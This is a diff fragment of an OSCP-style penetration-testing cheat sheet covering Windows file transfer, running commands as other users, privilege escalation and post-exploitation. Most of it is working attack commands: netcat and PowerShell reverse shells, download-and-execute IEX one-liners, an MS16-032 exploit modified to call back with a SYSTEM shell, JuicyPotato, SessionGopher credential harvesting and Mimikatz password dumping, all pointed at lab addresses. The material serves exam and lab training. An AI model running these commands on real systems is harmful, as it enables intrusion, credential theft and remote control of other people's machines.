+      Receiving objects: 100% (1612/1612), 5.87 MiB | 6.62 MiB/s, done.
+      Resolving deltas: 100% (1010/1010), done.
+      root@kali:~/test# cd nishang/
+      root@kali:~/test/nishang# cd Shells/
+      root@kali:~/test/nishang/Shells# echo Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444 >> Invoke-PowerShellTcp.ps1
+      root@kali:~/test/nishang/Shells# python -m SimpleHTTPServer 80
+      ```
+
   - You can install nishang via `sudo apt-get install nishang` which installs all of the reverseshells within `/user/share/nishang/shells/` to be used for purpose of reverse shells.
       `cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1`
   - After copying the script to your local working folder, copy one of the suitable example lines in the rev.ps1 to the bottom of the file:
@@ -944,38 +1311,6 @@ help
 - Creating a wget VB Script on Windows:  
     [*https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt*](https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt)
 
-- Windows file transfer script that can be pasted to the command line.  File transfers to a Windows machine can be tricky without a Meterpreter shell.  The following script can be copied and pasted into a basic windows reverse and used to transfer files from a web server (the timeout 1 commands are required after each new line):
-
-         echo Set args = Wscript.Arguments  >> webdl.vbs
-         timeout 1
-         echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  >> webdl.vbs
-         timeout 1
-         echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl.vbs
-         timeout 1
-         echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl.vbs
-         timeout 1
-         echo xHttp.Open "GET", Url, False  >> webdl.vbs
-         timeout 1
-         echo xHttp.Send  >> webdl.vbs
-         timeout 1
-         echo with bStrm      >> webdl.vbs
-         timeout 1
-         echo  .type = 1 '      >> webdl.vbs
-         timeout 1
-         echo  .open      >> webdl.vbs
-         timeout 1
-         echo  .write xHttp.responseBody      >> webdl.vbs
-         timeout 1
-         echo  .savetofile "C:\temp\windows-privesc-check2.exe", 2 '  >> webdl.vbs
-         timeout 1
-         echo end with >> webdl.vbs
-         timeout 1
-         echo
-
-      The file can be run using the following syntax:
-
-      `C:\temp\cscript.exe webdl.vbs`
-
 - Mounting File Shares
 
   - Mount NFS share to /mnt/nfs  
@@ -988,6 +1323,26 @@ help
     Also check : <https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/>
 
 ### Uploading Files
+
+Sometimes we will want to upload a file to the Windows machine in order to speed up our enumeration or to privilege escalate. Often you will find that uploading files is not needed in many cases if you are able to execute PowerShell that is hosted on a remote webserver (we will explore this more in the upgrading Windows Shell, Windows Enumeration and Windows Exploits sections). Uploading files increased the chances of being detected by antivirus and leaves unnecssary data trail behind. We will look at 4 ways of uploading files to a remote Windows machine from Kali Linux:
+
+1. VBScript HTTP Downloader
+2. PowerShell HTTP Downloader
+3. Python HTTP Downloader
+4. FTP Downloader
+
+_NOTE_ There are MANY more ways to move files back and forth between a Windows machine, most can be found on the LOLBAS project: <https://lolbas-project.github.io/>
+
+Most of these will require that we create a simple local webserver on our Kali box to serve the files (NOTE: I have had issues running this command within TMUX for whatever reason... so dont run it in TMUX). 
+I like to use the Python Simple HTTP Server:
+  `python -m SimpleHTTPServer 80` or `python3 -m http.server 80`
+
+Or the Python pyftpdlib FTP Server (again don't run from TMUX):
+
+  ```shell
+  apt-get install python-pyftpdlib
+  python -m pyftpdlib -p 21
+  ```
 
 - SCP
 
@@ -1041,6 +1396,174 @@ help
 
         /etc/init.d/pure-ftpd restart
 
+#### Uploading Files with VBScript
+
+In my experiance, VBScript is one of the easiest methods of transfering files to a remote Windows. The only downside is that the file size you can transfer is rather limited. I often have trouble transfering anything over 1 MB using this method and have to fall back on other methods (Windows-privesc-check2.exe is much too large to transfer using this method).
+
+- First lets test to see if we can run VBScript
+  `echo WScript.StdOut.WriteLine "Yes we can run vbscript!" > testvb.vbs`
+- Now we run it to see the results:
+  `cscript testvb.vbs`
+- If you see the following message, we are good to go with VBScript!:
+
+  ```CMD
+  C:\Users\Test>cscript testvb.vbs
+  Microsoft (R) Windows Script Host Version 5.812
+  Copyright (C) Microsoft Corporation. All rights reserved.
+
+  #Yes we can run vbscript!
+  ```
+
+- If you see the following messages, you should move on to PowerShell:
+
+  ```CMD
+  C:\temp>cscript testvb.vbs
+  This program is blocked by group policy. For more information, contact your system administrator.
+  C:\temp>testvb.vbs
+  Access is denied.
+  ```
+
+Now we can create a very simple downloader script by copying and pasting this single line of code into your windows commandline. I have tried to create a VBS script to download files from a remote webserver with the least possible number of lines of VBS code and I believe this is it.
+
+- If Windows is an older version of windows (Windows 8 or Server 2012 and below) use the following script:
+
+  `CMD C:\> echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs & echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs & echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs`
+
+- If Windows is a newer version (Windows 10 or Server 2016), try the following code:
+
+  `CMD C:\> echo dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs &echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs &echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs`
+
+- Now try to download a file to the local path:
+  `CMD C:\> cscript dl.vbs "http://10.10.10.10/archive.zip" ".\archive.zip"`
+
+#### Uploading Files with CertUtil.exe
+
+I've found that CertUtil can be quite reliable when all else seems to fail.
+  `certutil.exe -urlcache -split -f http://10.10.10.10/exploit.exe`
+
+#### Transfering Files using MSHTA
+
+Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). And it can also be used to transfer files :D
+
+- HTML
+  `C:\>mshta http://10.10.10.10/badthings.exe`
+- FTP
+  `C:\>mshta ftp://10.10.10.10:21/badthings.exe`
+
+#### Trasfering Files using Bitsadmin
+
+Background Intelligent Transfer Service (BITS) is a component of Microsoft Windows XP and later iterations of the operating systems, which facilitates asynchronous, prioritized, and throttled transfer of files between machines using idle network bandwidth. BITSAdmin is a command-line tool that you can use to create download or upload jobs and monitor their progress. For full, comprehensive documentation of the tool and all of its commands, see bitsadmin and bitsadmin examples in the Windows IT Pro Center.
+  `bitsadmin /transfer badthings http://10.10.10.10:80/badthings.exe c:\users\public\payload.exe`
+
+#### Uploading Files with PowerShell
+
+- Test to see if we can run Powershell:
+  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "get-host"`
+
+- Test to see if we can run Powershell Version 2:
+  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 2 -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "$PSVersionTable"`
+
+- Try to download a file from a remote server to the windows temp folder from the Windows command line:
+  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"`
+
+- Or from a PowerShell... shell:
+  `IEX(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"`
+
+- OR This one seems to work better while at the console:
+  `IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/exploit.exe", "C:\Users\Public\Downloads\exploit.exe")`
+
+#### Uploading Files with Python
+
+Sometimes a Windows machine will have development tools like Python installed. Check for python: `python -h`
+
+- Download a file using Python:
+  `python -c "import urllib.request; urllib.request.urlretrieve('http://10.10.10.10/cat.jpg', 'C:\\Users\\Public\\Downloads\\cat.jpg');"`
+
+#### Uploading Files with Perl
+
+- Sometimes a Windows machine will have development tools like PERL installed. Check for PERL
+  `perl -v`
+
+- Download a file using PERL:
+  `perl -le "use File::Fetch; my $ff = File::Fetch->new(uri => 'http://10.10.10.10/nc.exe'); my $file = $ff->fetch() or die $ff->error;"`
+
+#### Uploading Files with curl
+
+- Sometimes a Windows machine will have development tools like CURL installed. Check for CURL: `curl -v`
+  `curl 10.10.14.23:8080/winPEASEany.exe -o winpeas.exe`
+
+#### Uploading Files with FTP
+
+After running the python ftp lib on (`python -m pyftpdlib -p 21`) on Kali, you can try connecting using the windows FTP client:
+
+  ```CMD
+  C:\Users\pwnd>ftp 10.10.10.10
+  Connected to 10.10.10.10
+  220 pyftpdlib 1.5.3 ready.
+  User (10.10.15.31:(none)): anonymous
+  331 Username ok, send password.
+  Password: anonymous
+
+  230 Login successful.                                                                                                                      
+  ftp> ls                                                                                                                                 
+  dir                                                                                                                                       
+  421 Active data channel timed out.
+  ```
+
+If you are seeing a 421 timeout when you try to send a command it is likely because your connection is being blocked by the windows firewall. The Windows command-line ftp.exe supports the FTP active mode only. In the active mode, the server has to connect back to the client to establish data connection for a file transfer.
+
+You can check to see if the remote machine has Winscp.exe installed. Winscp is capable of connecting to an FTP server using passive mode and will not be blocked by the firewall.
+
+#### Transfering Files via SMB using Impacket
+
+Kali comes loade with the incredible Impacket library which is a swiss army knife of network protocols... just Awesome. You can easily create a SMB share on your local Kali machine and move files between Kali and Windows with ease. <https://github.com/SecureAuthCorp/impacket>
+
+- First we will setup the SMB Share on Kali like so:
+
+  ```shell
+  root@kali:~# impacket-smbserver root /root/Desktop
+  Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies
+
+  [*] Config file parsed
+  [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+  [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+  [*] Config file parsed
+  [*] Config file parsed
+  [*] Config file parsed
+  ```
+
+- Confirm it is up and running using Net View on the Windows command line:
+
+  ```CMD
+  C:\Users\Null>net view \\192.168.0.49
+  Shared resources at \\192.168.0.49
+
+  (null)
+
+  Share name  Type  Used as  Comment
+
+  -------------------------------------------------------------------------------
+  smbshare    Disk
+  The command completed successfully.
+  ```
+
+- Then we can trasnfer files from the command line as if it were a normal folder:
+
+  ```CMD
+  C:\Users\Admin>dir \\192.168.0.49\smbshare 
+  C:\Users\Admin>copy \\192.168.0.49\smbshare\loot.zip .
+  ```
+
+- By far the most interesting feature of the SMB Share method is that you can execute files directly over the SMB Share without copying them to the remote machine (fileless execution is so hot right now):
+  `C:\Users\Admin>\\192.168.0.49\smbshare\payload.exe`
+
+- A fancy trick I learned from IPPSec is to create a mapped drive to a remote SMB share like so:
+
+  ```CMD
+  net use y: \\192.168.0.49\smbshare  
+  y: 
+  dir
+  ```
 ### Packing Files
 
 - Ultimate Packer for eXecutables  
@@ -1059,11 +1582,9 @@ help
         cd setup  
         setup.sh -c
 
-## Privilege Escalation
+## Linux Privilege Escalation
 
-*Password reuse is your friend.  The OSCP labs are true to life, in the way that the users will reuse passwords across different services and even different boxes. Maintain a list of cracked passwords and test them on new machines you encounter.*
-
-### Linux Privilege Escalation
+**Password reuse is your friend.  The OSCP labs are true to life, in the way that the users will reuse passwords across different services and even different boxes. Maintain a list of cracked passwords and test them on new machines you encounter.**
 
 - Defacto Linux Privilege Escalation Guide  - A much more through guide for linux enumeration:
     [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
@@ -1240,7 +1761,9 @@ Handy Kernel Exploits
 - Find and display the proof.txt or flag.txt - LOOT!
       `cat find / -name proof.txt -print`
 
-### Windows Privilege Escalation
+## Windows Privilege Escalation
+
+*Password reuse is your friend.  The OSCP labs are true to life, in the way that the users will reuse passwords across different services and even different boxes. Maintain a list of cracked passwords and test them on new machines you encounter.*
 
 - Windows Privilege Escalation resource
     <http://www.fuzzysecurity.com/tutorials/16.html>
@@ -1390,31 +1913,55 @@ Without metasploit we can generate a shell and listen with netcat or metasploit 
 
 - Windows Run As - Switching users in linux is trival with the `SU` command.  However, an equivalent command does not exist in Windows.  Here are 3 ways to run a command as a different user in Windows.
 
-  - Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).
+### Sysinternals
 
-               C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 
+Sysinternals **psexec** is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).
 
-               PsExec v2.2 - Execute processes remotely
-               Copyright (C) 2001-2016 Mark Russinovich
-               Sysinternals - www.sysinternals.com
+      ```CMD
+      C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 
 
-  - Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:
+      PsExec v2.2 - Execute processes remotely
+      Copyright (C) 2001-2016 Mark Russinovich
+      Sysinternals - www.sysinternals.com
+      ```
 
-               C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
-               Enter the password for Test:
-               Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
+### Windows Run As
 
-  - PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.
+- Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:
 
-               $username = '<username here>'
-               $password = '<password here>'
-               $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
-               $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
-               Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
+      ```CMD
+      C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
+      Enter the password for Test:
+      Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
+      ```
 
-             Next run this script using powershell.exe:
+Prior to successfully performing a Windows run as, we of course need a valid windows username and password. Here is a oneliner powershell script to verify a username / password is valid on the local system:
 
-             `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`
+- Requires .Net 3.5
+  `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$username = '<username here>'; $password = '<password here>'; $computer = $env:COMPUTERNAME; Add-Type -AssemblyName System.DirectoryServices.AccountManagement; $obj = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$computer); $obj.ValidateCredentials($username, $password); }"`
+
+- Requires .Net 2.0:
+  `CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$username = '<username here>'; $password = '<password here>'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; Start-Process -FilePath C:\Windows\System32\calc.exe -NoNewWindow -Credential $credential; }"`
+
+**Switching users** in linux is trival with the SU command. However, an equivalent command does not exist in Windows. Here are 3 ways to run a command as a different user in Windows.
+
+  
+### PowerShell
+
+**Powershell** can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.
+
+```powershell
+ $username = '<username here>'
+ $password = '<password here>'
+ $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+ $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+ Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
+```
+
+- Next run this script using powershell.exe:
+  `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`
+
+### Others
 
 - Windows Service Configuration Viewer - Check for misconfigurations in services that can lead to privilege escalation. You can replace the executable with your own and have windows execute whatever code you want as the privileged user.  
     `icacls scsiaccess.exe`
@@ -1482,6 +2029,186 @@ Without metasploit we can generate a shell and listen with netcat or metasploit 
     `#meterpreter  >     run  post/windows/gather/win_privs`
     `cd\ & dir /b /s proof.txt`
     `type c:\pathto\proof.txt`
+
+### Windows Kernel Exploit (MS16-032)
+
+If the remote machine appears to be vulnerable to MS16-032, we can execute a powershell script from a remote server to exploit it.
+
+```shell
+Title      : Secondary Logon Handle
+MSBulletin : MS16-032
+CVEID      : 2016-0099
+Link       : https://www.exploit-db.com/exploits/39719/
+VulnStatus : Appears Vulnerable
+```
+
+Get the Powershell script from FuzzySecurity's Github, add an invoke to the end of the script and share the folder using the python SimpleHTTPServer:
+
+```shell
+root@kali:~test# git clone https://github.com/FuzzySecurity/PowerShell-Suite.git
+Cloning into 'PowerShell-Suite'...
+remote: Enumerating objects: 378, done.
+remote: Total 378 (delta 0), reused 0 (delta 0), pack-reused 378
+Receiving objects: 100% (378/378), 5.94 MiB | 2.06 MiB/s, done.
+Resolving deltas: 100% (179/179), done.
+root@kali:~test# cd PowerShell-Suite/
+root@kali:~test/PowerShell-Suite# echo Invoke-MS16-032 >> Invoke-MS16-032.ps1 
+root@kali:~test/PowerShell-Suite# python -m Simple
+SimpleDialog        SimpleHTTPServer    SimpleXMLRPCServer  
+root@kali:~test/PowerShell-Suite# python -m SimpleHTTPServer 80
+```
+
+The default version of the MS16-032 script will create a Pop-up CMD.exe window on the remote machine. Unfortunatly, we cannot access this from a limited shell... BUT we can modify the exploit to call a reverse shell. Its pretty easy to modify it to call a reverse powershell that will connect back to our machine with a System shell. We will need to modify line 330 of the exploit (the ip address and port will need to be updated of course):
+
+```powershell
+# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
+#$CallResult = [Advapi32]::CreateProcessWithLogonW(
+#    "user", "domain", "pass",
+#    0x00000002, "C:\Windows\System32\cmd.exe", "",
+#    0x00000004, $null, $GetCurrentPath,
+#    [ref]$StartupInfo, [ref]$ProcessInfo)
+
+# Modified to create a Powershell reverse shell 
+$CallResult = [Advapi32]::CreateProcessWithLogonW(
+    "user", "domain", "pass",
+    0x00000002, 
+    'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 
+    '-NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "&{$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"^> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"',
+    0x00000004, $null, $GetCurrentPath,
+    [ref]$StartupInfo, [ref]$ProcessInfo)
+```
+
+- On the remote host execute the exploit:
+  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-MS16-032.ps1'))"`
+
+- Or from a Windows Powershell:
+  `IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Invoke-MS16-032.ps1')`
+
+- Or if you wanted to upload the exploit, you can always run it like this:
+  `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"`
+
+On our Kali machine we create the reverse shell and ... BOOM! Root dance.
+
+```shell
+root@kali:~# nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.10.11] from (UNKNOWN) [10.10.10.10] 49182
+
+PS C:\Users\jimmy^> whoami
+nt authority\system
+```
+
+### Potato Attacks
+
+#### RottenPotato
+Service accounts usually have special privileges (SeImpersonatePrivileges) and this could be used to escalate privileges.
+
+<https://github.com/breenmachine/RottenPotatoNG>
+
+#### Juicy Potato
+
+When you have **SeImpersonate** or **SeAssignPrimaryToken** privileges available within windows; you can carry out Juict Potato Attack. We can do a `whoami /priv` to get an indication of privs:
+
+```text
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+```
+Which means `JuicyPotato.exe` is a good method of escalation. 
+
+- Download the JuicyPotato Binary from: <https://github.com/ohpe/juicy-potato>
+- Let's download it to the victim machine via:
+   `(new-object net.webclient).downloadfile('http://10.10.14.10/jp.exe', 'C:\users\merlin\desktop\jp.exe')`
+- Create a `Invoke-PowerShellTcp.ps1` file with contents of *nishang* `Inovke-PowerShellTcp.ps1` and ammend it with:
+   `echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port 9002" >> Invoke-PowerShellTcp.ps1`
+  *Don't forget to start the shell (P=9002)*
+- And run the `JP.exe`:
+   `./jp.exe -l 1337 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.10/Invoke-PowerShellTcp.ps1')" -t *`
+- There is a list of CLSID for JuicyPotato here[https://ohpe.it/juicy-potato/CLSID/]. 
+
+**It’s nearly impossible to prevent the abuse of all these COM Servers. You could think about modifying the permissions of these objects via DCOMCNFG but good luck, this is gonna be challenging.**
+
+### Fireeye Session Gopher
+
+Leveraging credentials is still the most common ways of privledge escalation in Windows environments. Session Gopher is a PowerShell script designed to automaticlly harvest credentials from commonly used applications.
+
+- To run Session Gopher, we will first need to pull down the latest version from the Fireeye github repository:
+  `git clone https://github.com/fireeye/SessionGopher`
+- Next we can serve it up on our local KALI instance by using the simple python HTTP server:
+
+  ```shell
+  root@kali:~/tools# cd SessionGopher/
+  root@kali:~/tools/SessionGopher# ls
+  README.md  SessionGopher.ps1
+  root@kali:~/tools/SessionGopher# python -m SimpleHTTPServer 80
+  Serving HTTP on 0.0.0.0 port 80 ...
+  ```
+
+- Finally we can file-lessly execute it from our remote Windows shell:
+  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/SessionGopher.ps1')); Invoke-SessionGopher -Thorough"`
+- Or from a Windows Powershell:
+  `IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/SessionGopher.ps1')`
+- Or we can download and run it:
+  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/SessionGopher.ps1\", \"C:\\Users\\Public\\Downloads\\SessionGopher.ps1\");`
+  and
+  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "& { . .\SessionGopher.ps1; Invoke-SessionGopher -Thorough}"`
+
+
+### Running Mimikatz
+
+Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of plaintext credentials from memory, password hashes from local SAM/NTDS.dit databases, advanced Kerberos functionality, and more.
+<https://github.com/gentilkiwi/mimikatz>
+
+#### Running traditional (binary) Mimikatz
+
+The original and most frequently updated version of Mimikatz is the binary executable which can be found here:
+<https://github.com/gentilkiwi/mimikatz/releases>
+
+- First we will need to download a Mimikatz binary and copy it to the remote machine
+
+  ```shell
+  root@kali:~/test# wget https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip     
+  --2018-10-16 15:14:49--  https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip                     
+  root@kali:~/test# unzip mimikatz_trunk.zip
+  ```
+
+- Now we will need to copy the 3 files (win32 or x64 depending on the OS) required to run Mimikatz to the remote server.
+  `@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimidrv.sys\", \"C:\\Users\\Public\\Downloads\\mimidrv.sys\"); (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimikatz.exe\", \"C:\\Users\\Public\\Downloads\\mimikatz.exe\"); (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimilib.dll\", \"C:\\Users\\Public\\Downloads\\mimilib.dll\")"`
+- Now, if we dont have an overly interactive shell, we will want to execute Mimikatz without the built in CLI by passing the correct parameters to the executable. We use the log parameter to also log the clear password results to a file (just in case we are unable to see the output).
+  `mimikatz log version "sekurlsa::logonpasswords" exit`
+
+- Otherwise we can use the Mimikatz shell to get the passwords:
+
+  ```CMD
+  mimikatz.exe
+  mimikatz # privilege::debug
+  Privilege '20' OK
+  mimikatz # sekurlsa::logonpasswords
+  ```
+
+#### Running Powershell Mimikatz
+
+The Powershell version is not as frequently updated, but can be loaded into memory without ever hitting the HDD (Fileless execution). This version simply reflectively loads the Mimikatz binary into memory so we could probably update it ourselves without much difficulty.
+  `wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1`
+
+- Fileless execution of Mimikatz from remotely hosted server:
+  `IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds`
+
+### Capture a screen shot
+
+The following powershell commands can be used to capture a screen shot of the remote computers desktop and store it as a BMP file.
+
+```powershell
+Add-Type -AssemblyName System.Windows.Forms
+Add-type -AssemblyName System.Drawing
+$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
+$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+$graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
+$bitmap.Save('screen1.bmp')
+```
+
+- If you are on CMD you can use this handy one-liner to execute the same powershell command
+
+`@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height; $graphic = [System.Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size); $bitmap.Save('screen1.bmp')"`
 
 ## Client, Web and Password Attacks
 
